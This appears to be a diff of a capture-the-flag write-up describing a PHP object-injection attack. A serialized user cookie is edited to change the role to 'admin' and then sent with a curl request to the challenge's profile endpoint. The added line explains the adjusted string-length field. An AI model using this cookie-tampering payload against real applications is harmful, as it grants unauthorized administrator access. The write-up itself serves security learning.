@@ -27,6 +27,8 @@ The role field contains death_genie, which likely has restricted access.
 
 `O:4:"User":2:{s:10:"\0User\0role";s:5:"admin";s:4:"name";s:4:"ryuk";}`
 
+Also, we use `s:5` instead of `s:11` is because `death_genie` is 11 chars long and `admin` is 5 chars long 😄
+
 After URL encoding the modified cookie, we can send a curl request to the `/profile.php` endpoint:
 
 `curl -i -b "PHPSESSID=29deb9c444ba74d75272ebae3733a80c; user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A10%3A%22%00User%00role%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22name%22%3Bs%3A4%3A%22ryuk%22%3B%7D" http://chall.ycfteam.in:4095/profile.php
